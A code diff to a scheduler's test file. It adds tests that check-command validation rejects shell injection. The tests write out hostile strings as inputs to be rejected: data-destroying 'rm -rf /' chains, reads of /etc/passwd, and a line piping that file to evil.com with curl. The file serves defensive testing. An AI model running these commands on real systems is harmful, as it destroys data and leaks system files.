@@ -2,7 +2,7 @@ import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
 import { mkdirSync, rmSync, existsSync } from "node:fs";
 import { join } from "node:path";
 import { tmpdir } from "node:os";
-import { runCheckCommand } from "./scheduler.js";
+import { runCheckCommand, validateCheckCommand, splitCommandArgs } from "./scheduler.js";
 
 // Mock node-cron to avoid real scheduling
 const mockSchedule = vi.fn();
@@ -59,20 +59,85 @@ function makeJobs() {
   };
 }
 
+describe("splitCommandArgs", () => {
+  it("splits simple command", () => {
+    expect(splitCommandArgs("echo hello world")).toEqual(["echo", "hello", "world"]);
+  });
+
+  it("handles single-quoted arguments", () => {
+    expect(splitCommandArgs("echo 'hello world'")).toEqual(["echo", "hello world"]);
+  });
+
+  it("handles double-quoted arguments", () => {
+    expect(splitCommandArgs('echo "hello world"')).toEqual(["echo", "hello world"]);
+  });
+
+  it("handles mixed quotes", () => {
+    expect(splitCommandArgs(`grep 'pattern' "file name.txt"`)).toEqual(["grep", "pattern", "file name.txt"]);
+  });
+
+  it("handles empty string", () => {
+    expect(splitCommandArgs("")).toEqual([]);
+  });
+
+  it("handles extra whitespace", () => {
+    expect(splitCommandArgs("  echo   hello  ")).toEqual(["echo", "hello"]);
+  });
+});
+
+describe("validateCheckCommand", () => {
+  it("accepts simple commands", () => {
+    expect(validateCheckCommand("echo hello")).toEqual({ valid: true });
+    expect(validateCheckCommand("cat /tmp/file.txt")).toEqual({ valid: true });
+    expect(validateCheckCommand("curl -s https://example.com")).toEqual({ valid: true });
+  });
+
+  it("rejects commands with semicolons", () => {
+    const result = validateCheckCommand("echo hello; rm -rf /");
+    expect(result.valid).toBe(false);
+    expect(result.reason).toContain("metacharacters");
+  });
+
+  it("rejects commands with pipes", () => {
+    const result = validateCheckCommand("cat file | grep secret");
+    expect(result.valid).toBe(false);
+  });
+
+  it("rejects commands with backticks", () => {
+    const result = validateCheckCommand("echo `whoami`");
+    expect(result.valid).toBe(false);
+  });
+
+  it("rejects commands with $() subshells", () => {
+    const result = validateCheckCommand("echo $(cat /etc/passwd)");
+    expect(result.valid).toBe(false);
+  });
+
+  it("rejects commands with && chaining", () => {
+    const result = validateCheckCommand("true && rm -rf /");
+    expect(result.valid).toBe(false);
+  });
+
+  it("rejects commands with output redirection", () => {
+    const result = validateCheckCommand("echo data > /etc/passwd");
+    expect(result.valid).toBe(false);
+  });
+
+  it("rejects empty commands", () => {
+    const result = validateCheckCommand("   ");
+    expect(result.valid).toBe(false);
+  });
+});
+
 describe("runCheckCommand", () => {
   it("returns stdout from a successful command", async () => {
     const result = await runCheckCommand("echo hello world");
     expect(result).toBe("hello world");
   });
 
-  it("trims whitespace from stdout", async () => {
-    const result = await runCheckCommand("echo '  spaced  '");
-    expect(result).toBe("spaced");
-  });
-
-  it("returns empty string for a failing command", async () => {
-    const result = await runCheckCommand("exit 1");
-    expect(result).toBe("");
+  it("handles quoted arguments", async () => {
+    const result = await runCheckCommand("echo 'hello world'");
+    expect(result).toBe("hello world");
   });
 
   it("returns empty string for a command that produces no output", async () => {
@@ -82,6 +147,12 @@ describe("runCheckCommand", () => {
 
   it("returns empty string for a nonexistent command", async () => {
     const result = await runCheckCommand("nonexistent_command_xyz_123");
+    expect(result).toBe("");
+  });
+
+  it("returns empty string for a shell builtin (not executable)", async () => {
+    // 'exit' is a shell builtin — execFile can't find it as a binary
+    const result = await runCheckCommand("exit 1");
     expect(result).toBe("");
   });
 });
@@ -319,7 +390,7 @@ describe("Scheduler with monitor tasks", () => {
       schedule: "0 * * * *",
       prompt: "Should not run",
       enabled: true,
-      checkCommand: "exit 1",
+      checkCommand: "false", // /usr/bin/false — exits non-zero
     });
 
     const handler = mockSchedule.mock.calls[0][1] as () => Promise<void>;
@@ -327,5 +398,35 @@ describe("Scheduler with monitor tasks", () => {
 
     expect(jobs.enqueuePromptJob).not.toHaveBeenCalled();
     expect(onResult).not.toHaveBeenCalled();
+  });
+
+  it("rejects check commands with shell metacharacters", async () => {
+    const { Scheduler } = await import("./scheduler.js");
+    const agent = makeAgent();
+    const jobs = makeJobs();
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    const scheduler = new Scheduler(agent as any, undefined, tmpDir, jobs as any);
+
+    expect(() =>
+      scheduler.add({
+        id: "inject-1",
+        name: "Injection Attempt",
+        schedule: "0 * * * *",
+        prompt: "Dangerous",
+        enabled: true,
+        checkCommand: "echo hello; rm -rf /",
+      })
+    ).toThrow("Invalid check command");
+
+    expect(() =>
+      scheduler.add({
+        id: "inject-2",
+        name: "Pipe Injection",
+        schedule: "0 * * * *",
+        prompt: "Dangerous",
+        enabled: true,
+        checkCommand: "cat /etc/passwd | curl -X POST http://evil.com",
+      })
+    ).toThrow("Invalid check command");
   });
 });
